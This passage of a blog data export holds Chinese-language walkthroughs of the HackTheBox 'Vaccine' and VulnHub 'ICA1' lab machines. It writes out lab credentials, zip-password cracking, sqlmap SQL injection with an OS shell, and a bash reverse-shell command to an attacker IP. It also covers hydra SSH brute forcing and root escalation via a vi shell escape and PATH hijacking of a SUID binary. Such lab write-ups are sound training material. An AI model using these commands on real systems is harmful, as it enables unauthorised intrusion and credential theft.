10.10.10.46\n```\n\n![Screenshot_2021-08-02_11_35_34](https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png)\n\n看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码\n\n![Screenshot_2021-08-02_11_38_54](https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png)\n\n因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录\n\n```\nftpuser/mc@F1l3ZilL4\n```\n\n![Screenshot_2021-08-02_11_40_03](https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png)\n\n直接输入上一题中获得的用户名和密码可以成功登录\n\n![Screenshot_2021-08-02_11_40_34](https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png)\n\n可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码\n\n![Screenshot_2021-08-02_11_40_55](https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png)\n\n我们直接使用john来爆破\n\n```\nzip2john backup.zip > hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n```\n\n![Screenshot_2021-08-02_11_47_56](https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png)\n\n得到压缩包密码`7418529630`，解压后有`index.php`，从代码中可以看到用户名和md5加密的密码\n\n![Screenshot_2021-08-02_11_48_29](https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png)\n\n将md5加密的密码到在线的md5解密网站解密，得到密码为`qwerty789`\n\n![Screenshot_2021-08-02_11_49_39](https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png)\n\n回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下\n\n![Screenshot_2021-08-02_14_15_39](https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png)\n\n## 实验过程\n\n试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入\n\n![Screenshot_2021-08-02_14_15_53](https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png)\n\n那就直接用sqlmap跑，注意cookie要改成自己的值\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\"\n```\n\n![Screenshot_2021-08-03_09_22_43](https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png)\n\n![Screenshot_2021-08-03_09_26_33](https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png)\n\n可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\" --os-shell\n```\n\n![Screenshot_2021-08-03_09_27_03](https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png)\n\n接下来反弹shell，开启一个监听端口\n\n![Screenshot_2021-08-03_09_27_50](https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png)\n\n在sqlmap的shell中输入\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.15.60/1234 0>&1'\n```\n\n![Screenshot_2021-08-03_09_28_01](https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png)\n\n成功接收到反弹的shell\n\n![Screenshot_2021-08-03_09_28_19](https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png)\n\n![Screenshot_2021-08-03_09_29_41](https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png)\n\n先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码\n\n![Screenshot_2021-08-03_09_31_35](https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png)\n\n接下来先得到交互式的shell\n\n```\n#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n得到交互式的shell后，可以通过`sudo -l`命令查看当前用户的权限，用户被允许编辑配置文件`/etc/postgresql/11/main/pg_hba.conf`，可以利用`vi`并验证密码提权至`root`\n\n```\nsudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n```\n\n![Screenshot_2021-08-03_09_33_34](https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png)\n\n![Screenshot_2021-08-03_09_34_36](https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png)\n\n输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得`root`权限\n\n```\n:!/bin/bash\n```\n\n![Screenshot_2021-08-03_09_35_30](https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png)\n\n最后就可以读取root的flag了\n\n![Screenshot_2021-08-03_09_36_08](https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png)\n\n\n\n> 参考：\n>\n> https://www.echocipher.life/index.php/archives/891/\n\n","source":"_posts/HackTheBox-Vaccine.md","raw":"---\ntitle: HackTheBox-Vaccine\ndate: 2021-07-13 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![Screenshot_2021-08-04_09_35_14](https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sC -sV 10.10.10.46\n```\n\n![Screenshot_2021-08-02_11_35_34](https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png)\n\n看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码\n\n![Screenshot_2021-08-02_11_38_54](https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png)\n\n因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录\n\n```\nftpuser/mc@F1l3ZilL4\n```\n\n![Screenshot_2021-08-02_11_40_03](https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png)\n\n直接输入上一题中获得的用户名和密码可以成功登录\n\n![Screenshot_2021-08-02_11_40_34](https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png)\n\n可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码\n\n![Screenshot_2021-08-02_11_40_55](https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png)\n\n我们直接使用john来爆破\n\n```\nzip2john backup.zip > hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n```\n\n![Screenshot_2021-08-02_11_47_56](https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png)\n\n得到压缩包密码`7418529630`，解压后有`index.php`，从代码中可以看到用户名和md5加密的密码\n\n![Screenshot_2021-08-02_11_48_29](https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png)\n\n将md5加密的密码到在线的md5解密网站解密，得到密码为`qwerty789`\n\n![Screenshot_2021-08-02_11_49_39](https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png)\n\n回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下\n\n![Screenshot_2021-08-02_14_15_39](https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png)\n\n## 实验过程\n\n试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入\n\n![Screenshot_2021-08-02_14_15_53](https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png)\n\n那就直接用sqlmap跑，注意cookie要改成自己的值\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\"\n```\n\n![Screenshot_2021-08-03_09_22_43](https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png)\n\n![Screenshot_2021-08-03_09_26_33](https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png)\n\n可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\" --os-shell\n```\n\n![Screenshot_2021-08-03_09_27_03](https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png)\n\n接下来反弹shell，开启一个监听端口\n\n![Screenshot_2021-08-03_09_27_50](https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png)\n\n在sqlmap的shell中输入\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.15.60/1234 0>&1'\n```\n\n![Screenshot_2021-08-03_09_28_01](https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png)\n\n成功接收到反弹的shell\n\n![Screenshot_2021-08-03_09_28_19](https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png)\n\n![Screenshot_2021-08-03_09_29_41](https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png)\n\n先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码\n\n![Screenshot_2021-08-03_09_31_35](https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png)\n\n接下来先得到交互式的shell\n\n```\n#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n得到交互式的shell后，可以通过`sudo -l`命令查看当前用户的权限，用户被允许编辑配置文件`/etc/postgresql/11/main/pg_hba.conf`，可以利用`vi`并验证密码提权至`root`\n\n```\nsudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n```\n\n![Screenshot_2021-08-03_09_33_34](https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png)\n\n![Screenshot_2021-08-03_09_34_36](https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png)\n\n输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得`root`权限\n\n```\n:!/bin/bash\n```\n\n![Screenshot_2021-08-03_09_35_30](https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png)\n\n最后就可以读取root的flag了\n\n![Screenshot_2021-08-03_09_36_08](https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png)\n\n\n\n> 参考：\n>\n> https://www.echocipher.life/index.php/archives/891/\n\n","slug":"HackTheBox-Vaccine","published":1,"updated":"2021-12-25T12:19:50.095Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyc0007wku12udq09b2","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png\" alt=\"Screenshot_2021-08-04_09_35_14\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sC -sV 10.10.10.46\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png\" alt=\"Screenshot_2021-08-02_11_35_34\"></p>\n<p>看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png\" alt=\"Screenshot_2021-08-02_11_38_54\"></p>\n<p>因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录</p>\n<pre><code>ftpuser/mc@F1l3ZilL4\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png\" alt=\"Screenshot_2021-08-02_11_40_03\"></p>\n<p>直接输入上一题中获得的用户名和密码可以成功登录</p>\n<p><img src=\"https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png\" alt=\"Screenshot_2021-08-02_11_40_34\"></p>\n<p>可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png\" alt=\"Screenshot_2021-08-02_11_40_55\"></p>\n<p>我们直接使用john来爆破</p>\n<pre><code>zip2john backup.zip &gt; hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png\" alt=\"Screenshot_2021-08-02_11_47_56\"></p>\n<p>得到压缩包密码<code>7418529630</code>，解压后有<code>index.php</code>，从代码中可以看到用户名和md5加密的密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png\" alt=\"Screenshot_2021-08-02_11_48_29\"></p>\n<p>将md5加密的密码到在线的md5解密网站解密，得到密码为<code>qwerty789</code></p>\n<p><img src=\"https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png\" alt=\"Screenshot_2021-08-02_11_49_39\"></p>\n<p>回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下</p>\n<p><img src=\"https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png\" alt=\"Screenshot_2021-08-02_14_15_39\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入</p>\n<p><img src=\"https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png\" alt=\"Screenshot_2021-08-02_14_15_53\"></p>\n<p>那就直接用sqlmap跑，注意cookie要改成自己的值</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png\" alt=\"Screenshot_2021-08-03_09_22_43\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png\" alt=\"Screenshot_2021-08-03_09_26_33\"></p>\n<p>可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot; --os-shell\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png\" alt=\"Screenshot_2021-08-03_09_27_03\"></p>\n<p>接下来反弹shell，开启一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png\" alt=\"Screenshot_2021-08-03_09_27_50\"></p>\n<p>在sqlmap的shell中输入</p>\n<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/1234 0&gt;&amp;1&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png\" alt=\"Screenshot_2021-08-03_09_28_01\"></p>\n<p>成功接收到反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png\" alt=\"Screenshot_2021-08-03_09_28_19\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png\" alt=\"Screenshot_2021-08-03_09_29_41\"></p>\n<p>先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png\" alt=\"Screenshot_2021-08-03_09_31_35\"></p>\n<p>接下来先得到交互式的shell</p>\n<pre><code>#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n</code></pre>\n<p>得到交互式的shell后，可以通过<code>sudo -l</code>命令查看当前用户的权限，用户被允许编辑配置文件<code>/etc/postgresql/11/main/pg_hba.conf</code>，可以利用<code>vi</code>并验证密码提权至<code>root</code></p>\n<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png\" alt=\"Screenshot_2021-08-03_09_33_34\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png\" alt=\"Screenshot_2021-08-03_09_34_36\"></p>\n<p>输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得<code>root</code>权限</p>\n<pre><code>:!/bin/bash\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png\" alt=\"Screenshot_2021-08-03_09_35_30\"></p>\n<p>最后就可以读取root的flag了</p>\n<p><img src=\"https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png\" alt=\"Screenshot_2021-08-03_09_36_08\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://www.echocipher.life/index.php/archives/891/\">https://www.echocipher.life/index.php/archives/891/</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png\" alt=\"Screenshot_2021-08-04_09_35_14\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sC -sV 10.10.10.46\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png\" alt=\"Screenshot_2021-08-02_11_35_34\"></p>\n<p>看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png\" alt=\"Screenshot_2021-08-02_11_38_54\"></p>\n<p>因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录</p>\n<pre><code>ftpuser/mc@F1l3ZilL4\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png\" alt=\"Screenshot_2021-08-02_11_40_03\"></p>\n<p>直接输入上一题中获得的用户名和密码可以成功登录</p>\n<p><img src=\"https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png\" alt=\"Screenshot_2021-08-02_11_40_34\"></p>\n<p>可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png\" alt=\"Screenshot_2021-08-02_11_40_55\"></p>\n<p>我们直接使用john来爆破</p>\n<pre><code>zip2john backup.zip &gt; hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png\" alt=\"Screenshot_2021-08-02_11_47_56\"></p>\n<p>得到压缩包密码<code>7418529630</code>，解压后有<code>index.php</code>，从代码中可以看到用户名和md5加密的密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png\" alt=\"Screenshot_2021-08-02_11_48_29\"></p>\n<p>将md5加密的密码到在线的md5解密网站解密，得到密码为<code>qwerty789</code></p>\n<p><img src=\"https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png\" alt=\"Screenshot_2021-08-02_11_49_39\"></p>\n<p>回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下</p>\n<p><img src=\"https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png\" alt=\"Screenshot_2021-08-02_14_15_39\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入</p>\n<p><img src=\"https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png\" alt=\"Screenshot_2021-08-02_14_15_53\"></p>\n<p>那就直接用sqlmap跑，注意cookie要改成自己的值</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png\" alt=\"Screenshot_2021-08-03_09_22_43\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png\" alt=\"Screenshot_2021-08-03_09_26_33\"></p>\n<p>可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot; --os-shell\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png\" alt=\"Screenshot_2021-08-03_09_27_03\"></p>\n<p>接下来反弹shell，开启一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png\" alt=\"Screenshot_2021-08-03_09_27_50\"></p>\n<p>在sqlmap的shell中输入</p>\n<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/1234 0&gt;&amp;1&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png\" alt=\"Screenshot_2021-08-03_09_28_01\"></p>\n<p>成功接收到反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png\" alt=\"Screenshot_2021-08-03_09_28_19\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png\" alt=\"Screenshot_2021-08-03_09_29_41\"></p>\n<p>先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png\" alt=\"Screenshot_2021-08-03_09_31_35\"></p>\n<p>接下来先得到交互式的shell</p>\n<pre><code>#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n</code></pre>\n<p>得到交互式的shell后，可以通过<code>sudo -l</code>命令查看当前用户的权限，用户被允许编辑配置文件<code>/etc/postgresql/11/main/pg_hba.conf</code>，可以利用<code>vi</code>并验证密码提权至<code>root</code></p>\n<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png\" alt=\"Screenshot_2021-08-03_09_33_34\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png\" alt=\"Screenshot_2021-08-03_09_34_36\"></p>\n<p>输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得<code>root</code>权限</p>\n<pre><code>:!/bin/bash\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png\" alt=\"Screenshot_2021-08-03_09_35_30\"></p>\n<p>最后就可以读取root的flag了</p>\n<p><img src=\"https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png\" alt=\"Screenshot_2021-08-03_09_36_08\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://www.echocipher.life/index.php/archives/891/\">https://www.echocipher.life/index.php/archives/891/</a></p>\n</blockquote>\n"},{"title":"ICA1 VulnHub Walkthrough","date":"2021-11-01T06:35:38.000Z","_content":"\n### 主机发现\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/11/01/DtOf6MJVR5ndoGe.png)\n\n### 端口扫描\n\n```\nnmap -Pn -p- 192.168.62.182\n```\n\n![](https://i.loli.net/2021/11/01/xCtO6cIAsQMSLDi.png)\n\n开放了22、80、3306端口\n\n访问80端口，是一个登录界面\n\n<img src=\"https://i.loli.net/2021/11/01/1ejgDTcrmNXdtRw.png\" style=\"zoom:80%;\" />\n\nqdPM是一个开源的项目管理系统，基于[Symfony](http://www.oschina.net/p/symfony)框架+PHP/MySQL开发，可以看到qdPM的版本为9.2\n\n### 漏洞发现\n\n搜索一下exploit-db看看有没有公开的exp\n\n![](https://i.loli.net/2021/11/01/yZIxHGg2QtN9LiS.png)\n\n可以看到这个版本存在数据库敏感信息泄露，可以未授权获取数据库连接信息和密码\n\n看一下利用方式\n\n![](https://i.loli.net/2021/11/01/6NC3oaG9FzRYWrl.png)\n\n### 漏洞利用\n\n我们可以通过访问`http://<website>/core/config/databases.yml`来下载包含数据库连接信息和密码的yml文件\n\n<img src=\"https://i.loli.net/2021/11/01/4WVgx7HBS19dC2P.png\" style=\"zoom:80%;\" />\n\n通过访问`http://192.168.62.182/core/config/databases.yml`成功得到了数据库的用户名和密码`qdpmadmin:UcVQCMQk2STVeS6J`\n\n接下来尝试登录数据库，进一步获取敏感信息\n\n```\nmysql -u qdpmadmin -h 192.168.62.182 -p\n```\n\n<img src=\"https://i.loli.net/2021/11/01/CGJbOxwdtpsjXzD.png\" style=\"zoom:80%;\" />\n\n在`staff`数据库中找到了五组用户名和密码，密码是经过编码加密的\n\n<img src=\"https://i.loli.net/2021/11/01/wFHBokpdDs89Aj3.png\" style=\"zoom:80%;\" />\n\n### SSH密码爆破\n\n将经过base64编码的密码字符串解码一下，记录到一个文本中\n\n![](https://i.loli.net/2021/11/01/QaPujeoxcKYhXGm.png)\n\n将用户名也记录到一个文本中\n\n![](https://i.loli.net/2021/11/01/ljuvOXPLYSUmhd5.png)\n\n用账户密码来爆破80端口的登陆界面无果，只能尝试爆破22端口了\n\n```\nhydra -L user -P password ssh://192.168.62.182 -f\n```\n\n![](https://i.loli.net/2021/11/01/cskMQEIqhPKT2fY.png)\n\n![](https://i.loli.net/2021/11/01/rUxToiE435wZ62q.png)\n\n成功得到了两组ssh的用户名和密码，尝试登录ssh\n\n先登录`travis`账号，获取到了第一个flag\n\n![](https://i.loli.net/2021/11/01/tCaRQhxnyWjlABZ.png)\n\n再登录`dexter`，看到有提示，应该是要利用可执行文件来提权\n\n<img src=\"https://i.loli.net/2021/11/01/i5gulQ2FmUo9j6b.png\" style=\"zoom: 80%;\" />\n\n### 权限提升\n\n先查看一下有执行权限的文件\n\n```\nfind / -perm -u=s 2>/dev/null\n```\n\n![](https://i.loli.net/2021/11/01/o3u5HCDSTckYPmG.png)\n\n用strings查看一下`/opt/get_access`\n\n![](https://i.loli.net/2021/11/01/BsXuYOF3ymfWdNl.png)\n\n可以推测执行`/opt/get_access`时会进行`setuid`操作，接着会执行`cat`命令\n\n为了证明我们的推测，我们对`get_access`进行反编译，我们通过伪代码可以比较清晰地看到，当执行`get_access`时会执行`setuid(0)`，再执行`cat`命令打印系统信息,并且执行的`cat`命令是没有指定路径的\n\n<img src=\"https://i.loli.net/2021/11/01/x7yHcPQhgoUrDG2.png\" style=\"zoom: 80%;\" />\n\n接下来我们可以通过伪造一个文件名为`cat`的可执行文件，文件内容为`/bin/bash`，并将文件路径设置为环境变量，这样执行`get_access`的时候，就会执行我们伪造的`cat`文件，从而使我们获得root权限\n\n```\necho '/bin/bash' > /tmp/cat\nchmod +x /tmp/cat \necho $PATH\nexport PATH=/tmp:$PATH\n/opt/get_access\n```\n\n![](https://i.loli.net/2021/11/01/z4WNPo1MdavIbrs.png)\n\n我们已经成功得到了root权限，最后我们通过`more`命令获取第二个flag\n\n![](https://i.loli.net/2021/11/01/yciWRaIrQzpNfk3.png)\n","source":"_posts/ICA1-VulnHub-Walkthrough.md","raw":"---\ntitle: ICA1 VulnHub Walkthrough\ndate: 2021-11-01 14:35:38\ncategories:\n- 渗透测试\ntags:\n- VulnHhub\n---\n\n### 主机发现\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/11/01/DtOf6MJVR5ndoGe.png)\n\n### 端口扫描\n\n```\nnmap -Pn -p- 192.168.62.182\n```\n\n![](https://i.loli.net/2021/11/01/xCtO6cIAsQMSLDi.png)\n\n开放了22、80、3306端口\n\n访问80端口，是一个登录界面\n\n<img src=\"https://i.loli.net/2021/11/01/1ejgDTcrmNXdtRw.png\" style=\"zoom:80%;\" />\n\nqdPM是一个开源的项目管理系统，基于[Symfony](http://www.oschina.net/p/symfony)框架+PHP/MySQL开发，可以看到qdPM的版本为9.2\n\n### 漏洞发现\n\n搜索一下exploit-db看看有没有公开的exp\n\n![](https://i.loli.net/2021/11/01/yZIxHGg2QtN9LiS.png)\n\n可以看到这个版本存在数据库敏感信息泄露，可以未授权获取数据库连接信息和密码\n\n看一下利用方式\n\n![](https://i.loli.net/2021/11/01/6NC3oaG9FzRYWrl.png)\n\n### 漏洞利用\n\n我们可以通过访问`http://<website>/core/config/databases.yml`来下载包含数据库连接信息和密码的yml文件\n\n<img src=\"https://i.loli.net/2021/11/01/4WVgx7HBS19dC2P.png\" style=\"zoom:80%;\" />\n\n通过访问`http://192.168.62.182/core/config/databases.yml`成功得到了数据库的用户名和密码`qdpmadmin:UcVQCMQk2STVeS6J`\n\n接下来尝试登录数据库，进一步获取敏感信息\n\n```\nmysql -u qdpmadmin -h 192.168.62.182 -p\n```\n\n<img src=\"https://i.loli.net/2021/11/01/CGJbOxwdtpsjXzD.png\" style=\"zoom:80%;\" />\n\n在`staff`数据库中找到了五组用户名和密码，密码是经过编码加密的\n\n<img src=\"https://i.loli.net/2021/11/01/wFHBokpdDs89Aj3.png\" style=\"zoom:80%;\" />\n\n### SSH密码爆破\n\n将经过base64编码的密码字符串解码一下，记录到一个文本中\n\n![](https://i.loli.net/2021/11/01/QaPujeoxcKYhXGm.png)\n\n将用户名也记录到一个文本中\n\n![](https://i.loli.net/2021/11/01/ljuvOXPLYSUmhd5.png)\n\n用账户密码来爆破80端口的登陆界面无果，只能尝试爆破22端口了\n\n```\nhydra -L user -P password ssh://192.168.62.182 